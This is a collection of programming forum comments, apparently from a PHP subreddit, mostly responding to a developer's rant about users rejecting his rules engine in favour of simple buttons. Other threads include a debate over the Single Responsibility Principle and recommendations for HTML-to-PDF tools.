[Yeah, welcome to the club, pal](https://i.imgur.com/xrTwqA5.png)
Maybe I am but would you rather have 1 button on your car in order to seek through radio stations or 50 which work exactly the same but only change how much the seeking is incremented by?
My OP was really more of a rant out of pure frustration. I promise I'm not that big of a jerk, and I do like my co-workers. Its just very frustrating to have to deal with this type of shit daily when all I want to do is code, not have to educate someone on why 1 person working on an app can't implement the same type of interface that has been developed by a team over decades, all because they're too lazy to download and open the .XLSX file which is readily available with the click of a button. I'd rather write something on Reddit anonymously to vent than upset someone who probably isn't being obtuse on purpose.
Create the rulesets for them, find the people who are getting the most uppity and guide them through face-to-face. Your ruleset system is too complicated and time-consuming for Steve in Accounts or Brenda in Sales to sit down and learn how to use, that's why they're asking for buttons: you're the programmer, they want you to program their rulesets.
Maybe have them save previous searches as buttons, like a bookmark. So they only have to search it once.
(even if I'm repeating parts of another reply now) most radios have a button to search, but also 5 to 10 buttons to save the current station. something similar might work with the software. it's still very flexible since you don't hard-code the station.
Maybe it can be argued that, since your software is very complex, they also need actual training for it. No company would sit someone in front of excel and expect them to know everything without prior knowledge.
Their filters are saved in a relational database table using their user id automatically.
That's okay, it's always difficult to judge people in written. 
Some radios have a list of favourites you can scroll through, others have buttons from 1 to 10. I absolutely agree that your solutions is valuable and you probably put a lot of effort into it, and now it’s underappreciated, so you’re frustrated. But in my opinion creating software is a mix of technical excellence, limited resources, user needs and their context, and many more. Neither of those would yield best results on their own. This is why I believe accepting those varied conditions is the best way to achieve zen ;) I don’t think that discussion is about technology. The tech point is clear here. It’s about a messy world, with people of different backgrounds clashing together in one place and time. What can you do? * Quit? Yes, you can always do that * Try to „fix” the world? You can try to fix the people around you, but sooner or later the problem will return as you’ll meet more people * Refuse to accept it and become the grumpy IT-guy? ;) * Embrace it and try to find exciting new challenges for you in adapting your technical skills to create things that will be better received by their users? I believe the latter is the most constructive. 
I was in your position until last week. Context: small business that have been using excel for everything for 14 years. Now they want an application for invocing, inventory, crm. I have 12 customers using my system and satisfied. I show the system to this customer and from the start he has a mentality of having a custom system, just so he can say they have a custom system. I've been fighting with him for two months, trying to convice him to not reinvent the wheel, but everytime it leaded to a useless discussion which ended with "but I want it this way, period". Last week he asked me for a special feature, hardcoded shit, for a temporary circumstance of the business. I tried to argue with him that there's another way of doing this. He then started to sidetrack and believes he the only way to grow as a business is using custom software, and started to compare his way of thinking with amazon, and some other multi million dollars companies. That's was the moment of my epiphany. I understood it all. It's not a matter of software, or doing the things the way it should be, or anything. It's just a matter of personal issues with the real world. Maybe it's an ego thing, or blatant ignorance, I don't know. But I had the revelation. And I started to build the system he wanted the way he wanted. Now I'm finishing this absolute useless piece of crap which takes more time to make an invoice than using excel, exactly as he wanted (I asked all the details via email, so I have a written proof). I stopped worrying and now, I know it sounds weird, but I'm so happy building this shitty non-functional application I can't explain it properly. So, maybe the problem is that you didn't listen to your customer, as I did. He was screaming at the top of his lungs that he wanted shit and I tried to give him gold. Now that I'm giving this horrendous piece of shit he is happy (today I showed him the last changes and was delighted). The best part of this situation is that now I don't need to think and re-think how to make every step better. It's almost as being on holidays. 
If they are paying you then you do what they want. You ask them to do proper specification of what they want. Not just "we want everything from excel". They need to create the use cases for all the functionality they want. Get it signed and then implement that. Your way is product development. You create an app how you think it should be done, and then try to sell it. That's a whole different story.
I cam to here to say more or less the first part of this. You could benefit from learning some UX design principles. Also, it is easy to think of people as stupid for not immediately assimilating *your* mental model of the problem as you see it. One of the primary purposes of creating workflow tools is to make people think less about the process of setting up their workflow, so that they can dedicate more brain cycles to their actual job. It is always worth having enough self-awareness to ditch the ego for a second and think "if all of these people are complaining in the same way, then perhaps I am the problem?". No tool should ever be designed without gathering full requirements from the end users, and I would argue that getting them to validate your design before you start work is also an absolute must to avoid situations where you plow in hundreds of hours only to have made something which never gets used.
What I think's being missed is that a .env file is generally used for dev (where setting real env variables might be fiddly) but production servers probably won't use it
Very interesting testimony. My 2 cents (I built a custom CMS like Drupal 7 on top of Symfony2, 5 years ago) : This is what happens when you focus on building the engine instead of user experience. And I did the same mistake when I started my career as a young CTO. You build stuff that you are proud of. That nobody will ever care about. While user are expecting their user experience to be perfect, and it's just meh. Because I would spend 90% of my time focusing on getting my code and architecture perfect instead of actually caring about real users. Most programmers tend to forget we are a service industry. Our goal is to make users life easier because they already have their own shit to deal with. You don't have the time to learn how to use your system. If they complain, they are not stupid, they are right. And you've just built the wrong solution. When two users give conflicting solutions, that's because they are both right. Unless you can give them a better user experience and long term vision of the product, they will keep complaining. Your UX should allow both users to find themselves confortable and get the immediate value out of the product. It's easy to recognize a bad product. Users won't use it or will be forced to and complain every single day about it. A good product is when users are actually using it, are pleased with the current state of it, and asks for improvements.
Yea, started out programming in basic and then C, and 37 years later, I still love it and problem solving. I moved into system administration which satisfies the problem solving and even programming to an extent. I started in on php 10 years or so ago and have a pretty large inventory program I created at work. 
The most irritating part of programming, is dealing with other people.
Solid rant! I feel your pain. Keep your chin up man, this stuff isn't easy. Hire a personal assistant if you can. If you can't, invest in a nice bottle of whiskey to keep under the desk. ;) We all gotta cope!
Chain smoker?? Lol .. what an amateur. 
Chain smoker?? Lol .. what an amateur. 
Let me share what happened to me less than 24 hours ago. Talking with customer over the phone. The app has a list of passengers that get in a bus and get down somewhere else. There were "groups" of passengers (people who travel thogether) so the field that sets the time they get on the bus, is mirrored, so the whole group is updated at once. I realize there is a bug, sometimes one person in a group will get on the bus at a different place, but the whole group gets down at the same spot. So I tell her, I will fix this now, so instead of matching the group, it will match the address where they get on the bus. This was yesterday 10 PM (after my 8 hours regular work day, my head was trashed). So I fix the bug. Eat dinner. Go to sleep. Today, 7 am, still in bed. Phone rings. 'hangfromthisone, the list is not working properly, it does not match the passengers group to update the time they get on the bus's' ...... ...... You fucking kidding me? 
&gt; And while I'm kidding, that's exactly the kind of discussions the vague language of SRP leads to. You may have been kidding, but your critiques betrayed an underlying misunderstanding of what "responsibilities" are. And, as I alluded to in my previous reply, this is easily the most common cause of people's criticisms of SRP. Each of your scenarios involved changing the class's single responsibility from one thing to a completely different thing, but that's not how "reason to change" works. A class has a reason to change if what it needs to do to satisfy its responsibility changes, *not* if the responsibility itself changes. The responsibility can't change, as a matter of fact, because the responsibility is the class's reason for existing. If that changes, then you're dealing with a different responsibility, and should be writing an entirely different class. Ergo: &gt; If the integer abstraction changes (say arbitrary precision math), this class has to change. No, this would be in a `BigIntAdder` class or similar. &gt; If the operation changes (say subtraction), this class has to change. No, this would be in an `IntSubtractor` class or similar. &gt; If the number of operands changes (say unary or ternary operators, etc.), this class has to change. This one is actually true. If mathematical law somehow got suspended and addition became a unary or ternary operation, then `IntAdder` would have to change. This is its one reason to change. &gt; If the operation is slow and needs to performed in an async way off-channel, this class has to change. No, this would be in an `AsyncIntAdder` class or similar. &gt; I can sum up most of your feedback to each rule in SOLID as "yes, I agree, this rule is not applied always and consistently, it depends". Then you misunderstood my feedback. SOLID principles always apply, and always apply consistently. But there's a significant, if nuanced, difference between "always apply" and "applies to everything" that you can't just sweep under the carpet here. If I tell you that you should always look both ways before you cross the street, that principle *always applies*. It does not, however, mean the same thing as telling you that you should look both ways before you do anything. And your critiques of several of the SOLID principles in your previous post relied on interpretations where they would "apply to everything" in terms of the code you write.
it took you 4 RC versions to realize it wont be in final version?
In react, your session/cookies could simply be your redux store..
Hey, I get that you're venting, and I hear you. Users are the worst. They take what you've built, and mangle it, misuse it... The only hell worse than [that smbc comic](https://smbc-comics.com/comic/punishment) would be watching a user work with your software all day... I've been in your shoes. I've had to change buttons to do X, then two weeks later, change them back to Y... then six months down the line, back to X, and back to Y a couple months later. I've had people say "it just needs to work like this" or "I can do this in excel very easily". I've had people expect me to copy dropbox in a week or two. You have to remember though that if you divide the world into programmers and users, the two groups _think_ differently sometimes. When you (or anyone else here probably) see the interface you built, they start thinking about how to formulate the question they're asking in a way that the computer understands. We do nothing else all day, so when we see your query builder we feel like we're right at home and start clicking, wishing we could just write the SQL query it's clearly generating in the background ourselves. A user doesn't think that way though... They want a certain report, but they don't really think about what selection criteria you need to put in to make that work. They know what they want, and if you sat them down and started talking them through it, they could probably figure out what to do with your forms, but it doesn't come naturally. What you've done here is the UX version of the [developer UI](https://blog.codinghorror.com/this-is-what-happens-when-you-let-developers-create-ui/). Your interface is shiny and attractive (in stark contrast to the examples in that link...), but you need to think like a programmer to use it, and most users just don't. They see your interface, get overwhelmed, and just want a button to click that'll do what they want.
Your project sounds to me like a TDWTF post I read years ago, where they were talking about rules engines like this one, but a lot more complicated. The point was some company had built an extremely versatile engine like yours and the end result was, it was too complicated and generic for the client to be able to configure it so in the end the programmers had to do it. So in effect, they made a kind of programming language and they might as well have built custom software. IIRC they call it the Inner Platform anti-pattern (not saying yours is one of these, btw). Rules engines can be pretty complicated to explain and understand for many people because many people aren't programmers like you and me. Some people look at the sort of screen you posted and go, "this is too complicated for me, I just want an Excel sheet with customers in it". So perhaps you're going to be spending time configuring their own software for them, maybe sit down with someone and explain what you're doing and hopefully then it'll click. Maybe one of those typical IT oddjob types can do it. &gt; it's quite simple: people are fucking stupid No it's not, and no they're not. Others have said that better than I in this thread and you don't seem to genuinely feel that way, but I really do feel I need to just say for anyone reading along who *does* actually feel this way, that this is a bad attitude to have.
&gt; Each of your scenarios involved changing the class's single responsibility from one thing to a completely different thing No they haven't. I just identified the list of existing responsibilities for you to see it. Inexperienced developers often conflate responsibilities together, as they can't differentiate them. And **/s** again, and yes this is happening around the world now with people discussing SRP "violations". Who gets to define what the "responsibility" of a class is. You? Me? Well we might not see things the same way. Who gets a final say? SRP doesn't clarify. If shoving your business logic in your template a violation of SRP? Because there's the "business logic" responsibility" and the "user interface" responsibility, right? No, I can say *absolutely not; the responsibility of this template file is to render a page; the business logic is just a part of the "render a page" responsibility*. And what would you say to that, that's unambiguous and objective, rather than abstract and subjective? You can say nothing. You can have the Spidey Sense deep in your stomach that this is wrong, but the SRP didn't teach you this. Only your experience did. You have a strong knack for building straw-men, though. That's fascinating to observe. &gt; Then you misunderstood my feedback. SOLID principles always apply, and always apply consistently. Yes, as we demonstrated with your "IntAdder" class, right? You have absolutely nothing to show me where SRP clearly defines the responsibilities of this class. All you have to offer me is your point of view, and I have my point of view. That's not that "always applies, consistently" means, when having N people results in N opinions about how to apply it. 
My #1 rule for every project I take on, specified in the contract: You will nominate one stakeholder to be the spokesperson for all stakeholders. Theis person will be the contact for all material discussions on the project. The other stakeholders agree that the spokesperson is authorised to make decisions about the project on behalf of the business. This means they can spend all the time they need arguing about the minutae of the specification, and I just need to implement the final decision.
Non-technical people have no idea of the amount of work required to cater to their needs (perceived or otherwise) and even if they do, a large percentage of them don't know how to articulate these needs. The best possible thing that could happen for you is to have a business analyst between you and the client and never deal with their requests directly. A good business analyst can be hard to come by but is worth their weight in gold. Then again, a lot of clients/employers don't understand the value or the work and thus won't pay for the extra man power. Best of luck in the future.
How does one person being overly rude and suggesting a library that happens to be part of the Symfony project reflect any worse than you being arrogant and also mentioning Laraval? I mean, to me neither of you reflect on your respective communities, just on yourselves. Re: arrogance Your OP is dripping with arrogance. Yes, I get you are frustrated. But you are expecting these non technical types to look at your rule engine and do backflips of joy. Combinatorial logic like that doesn't click for a large portion of the population. You'd be better off (happier, more respected by your customers) to ingest their input about custom views or whatever and turn those into easy to access views for the customer using your rules engine. You've made a tool that's great *for you* and for any of your technically inclined customers. Getting upset when the other customers don't want to learn the ruleset engine is going to give you an ulcer and result in unhappy customers.
You need to find better clients. If you’re in the states around Milwaukee, WI, let me know :).
We use this framework on a few applications. All of them are big applications. I highly recommend it.
You are doing something you must never do, talk with clients, directly, it is wrong, between the programmers and the clients must have a COMPANY, clients talk with company and company make PRICES, after they decide the company ask to the programmer to do a list of things, end. p.s.: Company mean: 1 or more people write everything down. 2 an analysis expert that understand ALL the project and divide it in steps. 3 a good vendor that ask enough money for the company for the analyst and for the programmer and of course for the vendor.
This framework combines very well PHP and Javascript. You will like the features offered by agile toolkit.
A guy I work with swears by slim framework. I'm partial to laravel, but it's not simple.
There's also a Youtube presentation: https://www.youtube.com/watch?v=02KBkJNGr6M
You need a good analyst working with you. I am an analyst and I protect my development team from this kind of shit. All of this would have been figured out in the requirements gathering phase before you even wrote a line of code. If the sponsors didn't like the result after signing off on the requirements and solutions documents then we would have an objective document to refer to to settle disputes.
Surely, AgileData and UI is new and innovative approach but let me say a little more about it. This approach is been backed up by more then 10+ years of improvement and practice. We are using the older version (ATK4.3) That it self is a fresh approach in the industry but new things in AgileDATA &amp; UI looks so great. It's a great work again from you Romans. Will be definitely following to use new versions in next/existing projects. Again superb work.
I used to work on a site on a very large site for a very large company (over 2 mil hits a day). I was new, so whenever I was asked to do anything, I did it. This became well-known, and although I was on a team and had a manager, etc, the company in question would come directly to me to do things. I never put in tickets for it, because I was new and was just happy people were leaning on me for things; however, it was impacting my time on my tickets. My manager started to notice this and pulled me aside. We went into a meeting, and he flat told me this: "Stop placating them." I finally started to realize how much they were actually fucking me over and worse - fucking over my whole team (unexpected code and functionality in the code base). I can't tell you how good it felt the first time they asked me to do something, and I just point blank said, "No. I'm not doing that." I know this doesn't entirely relate, because sometimes you obviously can't say "no," but I do feel your pain. The customer is an asshole. As someone that was in tech support for year and hated developers, I now understand their pain. I always thought they were lazy assholes that refused to implement anything, but now I know it's just that we have 10,000 requests, and most of them contradict each other. Being a developer is a pretty thankless job. But that paycheck is all the thanks I need.
Thanks Gowrav :)
&gt; You need a good analyst working with you. Came here to say this -- never has a team been more in-need of a strong business analyst than this situation. I quit coding professionally 15 years ago and became a project manager, largely because of situations similar to what OP described in his post. It sounds like OP is working for a smaller company that doesn't have native IT. What he ought to do is sit down with the CEO, since he's obviously got a relationship with that person, and be point-blank. Describe the problem and a potential solution. The solution is this: OP needs a business-side point person who will carry the responsibility of shaping what the CRM tool will be. OP needs to be the one slinging code; let someone else handle the planning, roadmapping, and talking to the client.
No, you got downvoted for your attitude.
&gt; can you guys try and find a common ground and then we can talk about a solution that would make you both happy" That sounds a lot like "design by committee" to me. I'd say OP (or rather OP's team, because this isn't a one-man job) needs to get their *needs* then implement a solution that covers all those needs. "I implemented a way they could program the system themselves" raises all kinds of red flags to me. Like, I could write a chapter on why that scares me.
Time and Money. Whenever the business asks for something from IT, the answer is yes we can do it - provided we have time (people) and money (budget) to do it. Also business requirements upfront - build to those specific requirements and if there is a problem - well it was built to YOUR requirements. But doesn't your outfit have analysts? Or is it a small shop. The companies that I have worked for had business analysts and that is their job to be the buffer between the business and IT. They filter out some of the nonsense requests that make no sense and figure out where the company is going to get the most bang for their IT buck from a project. 
&gt; I'm so happy building this shitty non-functional application I can't explain it properly Sometimes this is business. This is what they need, this is what they want, this is what they're going to pay you decently for. Sometimes we simply make peace as best we can and built the turd we're asked to build, because sometimes it's the only option available. 
&gt; when all I want to do is code I call those guys "lone wolf" programmers. I used to be one, and I still tend that way. They're fantastic if I can give them really well-specced problems - they go away, implement them, and come back with exactly what I asked for. But people who can collaborate, communicate, gather requirements, and produce workable solutions... I don't have to pre-chew their food for them, and so they're way more valuable to me. Your value isn't in the code you write, it's in the problems you solve - ideally, without writing any code at all. Food for thought.
&gt; No they haven't. I just identified the list of existing responsibilities for you to see it. I can absolutely say that with the same amount of confidence with which you feel I "replaced" the class responsibilities. You know perfectly well that, as written, `IntAdder` does not have the responsibility to subtract integers. You're confusing the responsibilities it *has* with what you *want it to have*. SRP is about constraining your code to a single responsibility, not constraining what it could theoretically be changed to. &gt; After all, inexperienced developers often conflate responsibilities together, as they can't differentiate them. True or not? You know it's true. That's absolutely true, and it's true even of very experienced developers. &gt; And what would you say to that, that's unambiguous and objective, rather than abstract and subjective? You can say nothing. You can have the Spidey Sense deep in your stomach that this is wrong, but the SRP didn't teach you this. Only your experience did. Identifying responsibilities isn't always easy (and certainly isn't easy to teach or explain), but it's also not subjective. Some people are better at identifying them than others, and most will get better at it over time, just like anything else. If you ask a new driver what they should do in a given traffic situation, the answer is not subjective. They may not know, and they may even argue with you about it (if I had a nickel for every time this happens between myself and my SO), but that doesn't mean that there isn't a correct answer. Neither ignorance nor disagreement implies subjectivity. &gt; Who gets to define what the "responsibility" of a class is. You? Me? Well we might not see things the same way. Who gets a final say? SRP doesn't clarify. It isn't SRP's job to define what the responsibility of a class is, or who gets to do so. It's SRP's job to insist that it only has one responsibility, and no more than one. The fact that it doesn't say who gets a final say is not surprising, in the same sense that it's not surprising that the principle of "every resident of a state must have Congressional representation" doesn't say who gets to decide who draws the representation districts. &gt; Yes, as we demonstrated with your "IntAdder" class, yes? No, and I explained in detail why not. &gt; You have absolutely nothing to show me where SRP clearly defines the responsibilities of this class. That's because defining the responsibilities of a class is not SRP's job. As just mentioned, SRP's job is only to insist that a class have only one of them. &gt; All you have to offer me is your point of view, and I have my point of view. There is no point of view. The only matter of opinion when it comes to class responsibility is what that responsibility should be. SRP is very objective in its insistence that the class only has *one* responsibility. If I say the class should do just X and you say the class should do X + Y, you're objectively wrong, and your point of view is irrelevant. If you say it should do just Y, then we get to have a professional debate about the merits and drawbacks of X vs. Y, but no matter which we decide on, SRP adherence is assured. &gt; If you can give me a clear rule using logic and rational thinking in defining the responsibilities of this class, which does not rely on your opinion about what's right and what's wrong, do it. You haven't done so yet. There is no rule for "defining the responsibilities" of a class. That's not what SRP does. It's up to whoever designs the class to choose a responsibility for it. SRP only insists that that person/team stick to one responsibility and not multiple. If you're asking how to determine the difference between one vs. multiple, then that is absolutely objective, but again, difficult for a lot of people. It isn't SRP's job to train you how to recognize when your "one responsibility" is not actually one, but multiple responsibilities. When I'm mentoring newer developers, I often ask them to write exactly what the class does in one sentence, then instruct them to look for the word "and" (an indicator, not a guarantee). Another method is to ask them to look at the various ways the class will be used, and whether those contexts are equivalent. A class should be usable in different places, but never for different reasons. I reject classes like `TwitterApi` all the time because of this. "Interacts with the Twitter API" is not a singular responsibility; it's a "similarity umbrella" for a whole slew of different responsibilities. They want to group everything into one class like this because they're all related to the Twitter API in some way, but that's looking for how things *are*, rather than what they *do*. The SRP violation here is abundantly clear when looking at how differently the class would get used in various places. But there are no guidelines for answering the inevitable follow-up question "well, what classes should I make then?" The answer is always "it depends". But it's also always consistently "it depends, but they should all only have one responsibility."
If you use [one of these issue trackers](https://imgur.com/a/httTV) you can setup PHPStorm to work with them. Then you can switch tasks from upper right dropdown box and it will save scope automatically :) 
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/DxIiV7O.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) 
Contexts are neat along with tasks I have a GitLab server running on our internal network at work PHPStorm is configured to pull 'tasks' from the specific project's Issues list Going to `Tools &gt; Open Task` opens a menu of all open issues to search and choose from. Opening an issue as a task creates a new context specific to that issue and offers to create a new feature branch(Default named `Issue_*IssueNumber*`) for it as well. AND it offers to create a new change list. The change list is by default named `#*IssueNumber* *IssueTitle*` which also acts as a hyperlink to the issue page on my GitLab server. Seen [here](https://i.imgur.com/SOPrEXq.png) This also ties in with the Time Tracking component. When I open the task the Time Tracker switches to that task, when you switch away from or close the task it pauses the timer. 
I haven't done any test with big document but [wkhtmltopdf](https://wkhtmltopdf.org/) always works great for me. You can find a php wrapper for it [here](https://github.com/KnpLabs/snappy) and a symfony bundle if needed [here](https://github.com/KnpLabs/KnpSnappyBundle).
My company recently had a task to save page with some charts to PDF. There were things there such as Google maps. They estimated it to one week. They burnt themselves several times with all kind of solutions. In the end, it took them 3 months and lot of nerves to realize best solution is to just invoke print functionality in web browser. They would be fucked when user requests this to generate in background and send it e.g.via email haha. 
&gt; You know perfectly well that, as written, IntAdder does not have the responsibility to subtract integers. Please tell me what responsibility it has, then. It's not adding integers, because the plus operator does that already. It's not called the "Zero Responsibility Principle" for a reason. &gt; Identifying responsibilities isn't always easy (and certainly isn't easy to teach or explain), but it's also not subjective. It seems you don't understand what "subjective" means. Any higher level discussion when we can't get basic words in the English language right would be hard. &gt; It's up to whoever designs the class to choose a responsibility for it. Yes, that's the meaning of "subjective", genius. &gt; If you're asking how to determine the difference between one vs. multiple, then that is absolutely objective. OK, if it's objective, define the rules for determining one vs. multiple. Let's hear it. No hand-waving of "the science of determining this is vast and mysterious". Define it for me. Use math, using set theory, use logic, use whatever you wish. Anyway, it seems you're quite early in the process of wrapping your head around all this. Not only are responsibilities subjective, but they *also change* over time as the concerns in every part of the projects evolve. No project has static concerns, etched in stone. This is why no project is also impervious to requiring refactoring. If you don't have this clear for yourself, you'd making some very basic architectural mistakes, suffering under the illusion that you can get every class "just right" because its responsibilities, or even their count alone, is objective and unchanging. You've lots of bread to eat and lots of "covfefe" to drink before you understand what I'm telling you I feel.
True... But that can't be done for us :) Se must aply a certificate to our documents and we must allow that customers may download the PDF if they want so :) 
Second best solution I believe is to use headless chrome. If your content is complicated, avoid pure php libraries, wkhtml and phantomjs, they all have outdated engines which show content differently than modem browsers.
Where are arrow functions? 
Haha, good luck! This has been such a constant pain in the ass. I've spent so many hours on this, never to find a satisfactory solution. I ended up using a headless chrome instance to save the screenshots, and still Chrome screwed up the page breaks. Of course this is very slow and inefficient, and also difficult with PHP's crappy process handing abilities. My advice is to find a way to avoid it entirely if at all possible!
This is an epidemic among management, especially mid to upper level manager, directors, VPs, etc. They don't want to lift a finger to do anything. It *must* be spoon fed. I've created real time reports that you can just book mark in your browser so that you can always get the latest data at the click of a button..."Can you email that to me twice a day?" I sit in presentations where I can say "just press 'X' to get 'Y'" and have someone say, "I don't understand. What does 'X' do again?" I like to say "Management would starve to death at a buffet if no one was there to hand them a cracker."
If you can't get more people, try your damnedest to think along both the lines of a regular user and yourself as a developer. A regular user does not give any shits about the intricacies of your application and just want to do their job as lazily as possible. Find something about your job that you feel similarly about, like your office chair.. maybe you don't give two shits who or how they made it, it just needs to be comfortable and the controls need to work. Sounds like standard user stuff, where the base functionality is perfect for what they want to do they just don't want to learn how to do it and want someone to do it for them.
you're making a lot of sense. this is about making your dev environment load configuration from a mocked environment variable (loaded from an .env file) where a production environment variable will later determine behavior
&gt; As far as whether SOLID is vague or not. Maybe it is vague, but I would be hard-pressed to come up with a more specific set of rules. There's no requirement to have a specific set of rules. Bob Martin needed a specific set of rules and a catchy acronym, because stuff like "G.E.T.R.I.C.H. the seven quick ideas to getting filthy rich" sells. It's tempting to think that you can learn 5 ideas and get to the next level of software engineering, but it's just a marketing lie. &gt; Maybe you can illustrate some that you like, or maybe you're of the opinion that rules and programming are incompatible. That's way too broadly over-generalizing. Obviously programming is full of rules. But that's kind of the point. It's full of rules. Thousands of them. Silver-bullet combos don't amount to anything except a sales tactic for consultants.
You have to stand up for yourself, your profession, and your professionalism. The can't ask you to make the software work 2 different incompatible ways because that is not possible. They hired you to say no. You are the programmer, so you know what is possible, and what is not, what has dire consequences to the maintainability of the code, and what does not. You know whether or not maintainability of the code matters or not. No managers that don't understand programming know this stuff, they hired you to know it. If you asked your doctor not to wash their hands because it was slowing them down and you want them to treat you faster, what should they do? Now of course, after you say no, your managers will put pressure on you, because they believe that is how they find the truth. But after the pressure is on, and you still say no, eventually they will believe that you must really mean it, and accept your professional knowledge. Or they will fire you and then you get to find a better place to work. These sound like project management issues. You should really learn about agile and introduce it into the organization. Don't only learn scrum, but also the GROWS method, and extreme programming. GROWS may never be complete, but I like how they explain iterations and experimentation. Extreme programming is unpopular now, but it is one of the more technically demanding /disciplined methodologies. You don't necessarily need to do them, but learn them. The disciplines gives you leverage to tell your employer what it takes to fulfill their requests. There is never a need to make the code unclean or umaintainable to get a feature working. But the get it done yesterday mentality will cause that. They don't decide whether you take the time to write tests and clean code, you do. Your manager feels there is risk in having you write tests and refactor, and they are not equipped to properly assess that risk, so if you leave it up to them, they will say no. It is your job to take on that risk because you have the expertise to assess it. You can't ask a doctor not to wash their hands. You can't ask a doctor to break their oath. Well, you can, but then what is the doctor supposed to do? Are they more professional, or less professional if they go along with this insanity?
I do exactly this with wkhtmltopdf. Dont waste time with other solutions for this use case. Its easy to use, and the results are excellent.
Did I write this?
This is a classic problem in software development. The users don't know what they need. The users are wrong about what they want. The users are unwilling to learn new tools even if those new tools solve their old problems much better than their old tools. The users can't tell the difference between a bug and a feature. The users are your worst security problem. The users are ungrateful little shits who take all your word work for granted and treat you like some kind of hired help like a janitor or waiter. Yep, it sucks. You need some people to stand in between you and your users. Doing it all yourself is causing you to burnout. You need a user facing support specialist who will handle communications like this. You probably also need a product designer who sits with the users ahead of time to work out what kind of software they actually want to pay for. 
Also, I think you are in the mood to enjoy this video: [Coding Sucks: Why a Job in Programming Is Absolute Hell](https://www.youtube.com/watch?v=MticYPfFRp8)
a person will be short-term happy when they think they got what they wanted. they will become long-term sad when they wake up to the realization that what they thought they wanted was not what they needed. 
Defending OP, I would say while a majority of people aren't developers, a majority also have zero interest in trying to understand what's happening on their computer. They just want to be told "Click this, type that". They're totally setting themselves up for failure in our tech-driven future. You take time from your busy schedule to explain something to some individuals in laymans terms, they say they understand and have it covered, all to have them get angry and ask same question two weeks later. If you won't take any initiative to learn, why should I have to learn you situation and help you? If I go to Spain and don't speak Spanish, I'm expected to learn, at least a little but if Spanish, or it's going to be very difficult for me to navigate in that world. If I do learn a little Spanish, it's much easier for me to navigate in that world, and people, people are friendlier, and what they say "makes a lot more sense".
I personally like dompdf [https://github.com/dompdf/dompdf](https://github.com/dompdf/dompdf) However wkhtmltopdf is still good, however for me, I like to have a composer module and know I dont need any command line tools installed to my server(s) before it'll work.
underrated comment. a really common problem that programmers run into is that what makes sense to them doesn't make sense to their users. programmers are FANTASTIC at abstracting, logic, thinking terms of operations (as opposed to thinking in terms of outputs), and at dealing with combinatorial complexity. These are wonderful ways to be able to think but they are difficult, require training and practice, and are utterly beyond some people no matter how hard they try. 
Excel is also extremely complicated and the reason people say things like "I just wanted Excel in my browser" is because they don't have any frame of reference _besides Excel_ for discussing the technical problem they're trying to solve. 
Holy shit! There are a couple of things I still need to figure out, because it's different on Atom. Like the indentation setting is Ctrl + { / }. PhpStorm I think is Shift + Tab?
Sounds like your company needs a Business Analyst role that sits in between the end users and the I.T department. Half their job is to mitigate stuff like this so the level of BS never hits the Devs.
I'm looking for good PHP devs to onboard at the contracting firm I work for. 100% remote work, 100% senior devs. Small teams, and even if you get hair-brained requests from the clients, at least we get well-compensated for their decisions. Also, we're willing to fire clients to keep talent. (not posted under my regular account)
[Prince](https://www.princexml.com/) has worked very well for us. It is not free, but you can try it out for free with watermarks. It's done a much better job of handling HTML and CSS than anything else we have tried.
It's kind of interesting how the most valuable programmer is probably the one who writes the least/not any code.
I'd love to try prince, but dammm 3.8k a license... 
I can agree with you on this one.
You should work with your hands for a time, then come back and see what an exclusively nice job we have.Because as long as you're not the boss of a company, things in the most jobs are the same.
I see what your saying. I worked with another guy who was a "lone wolf" programmer before. I like to interact with people and get their feedback and suggestions. I also like to think that most custom built software is never complete. There will always be someone else who comes along and asked for something else. If you code your projects with the mid-set that this will change in the future by making code modules, then making those changes will be easier, and when the program goes full circle and you need to go back to what it was a year ago, you can simply comment out the calls to the new modules and call the old ones. This also keeps the clutter down when editing, and reediting the same bit of code.
I can argue that getting the full requirements on the front end from end users is difficult. From my experience, when you write some code they only need one goal accomplished, and after they see that the end users ask for two more things, then their co-worker sees how easy their job is and wants the same thing for them and now you have to change the code to accommodate more wishes. I think if more people coded with change in mind, their future edits would be easier to accomplish.
Then just use jquery and be done with it. No point in using React if you’re not going to do it properly. Further, my recommended approach may take some more code upfront but it’s the better and more maintainable approach long term. 
&gt; The thing is, I absolutely love coding itself. For me, not only is it a job, but also a hobby. I spend most of my free time coding when I'm not doing work for actual companies This very sentence suggests to me you're under 30 and are single. I too was in this position at one point in my life and I did start hitting burn out mainly around jobs rather than coding its self. Now in my 30s with a girlfriend and 2 kids I'm starting to find that drive again but strictly in working hours. It feels nice to work a normal day then come home and have nothing to worry about other than my family. It keeps balance in my life.
Seems to me you should make a UI personalized for every user.
&gt; I think if more people coded with change in mind, their future edits would be easier to accomplish. That's interesting especially when people are taught to write code for what you need rather than over-engineer code for what you might need.
Well, I've worked as an end user, a systems tester and have done UX design and development. It's hard to accurately gather user requirements yes, but arguably less frustrating than ploughing weeks of work into something which no one uses because the UX is a barrier to adoption. When you are coding, you are continually in a pattern of very complex thought, of how to take a simple problem and abstract its solution into complex code. When you're a user, the solution needs to feel less complex than the problem, else you may as well solve the problem manually. Basically, if all of your users are complaining about your tool, then it's probable that your tool is designed to your requirements for the problem, not theirs. Calling them stupid is understandable, as OP in on the wrong end of a lot of hours of work, but probably doesn't realistically describe the overall situation, which is that their is a mismatch between the mental models of the developer and users. When you are given a single problem to solve, then yes - problem goes in, solution comes out is a pragmatic way to code. If you are developing an entire tool which people need to incorporate into their daily lives, then it shouldn't add complexity, it should remove it. UX design frontloads the development time, but if done right, will significantly reduce the amount of changes which need to be made later, while also giving you the satisfaction of watching every asshole actually use the thing.
You cannot always just say "no" when you work for a small privately owned company. I mean if the office has like 10 people and the boss walks up to the only programmer in the building and says he wants a PHP version of Excel. You either do it, or find another job.
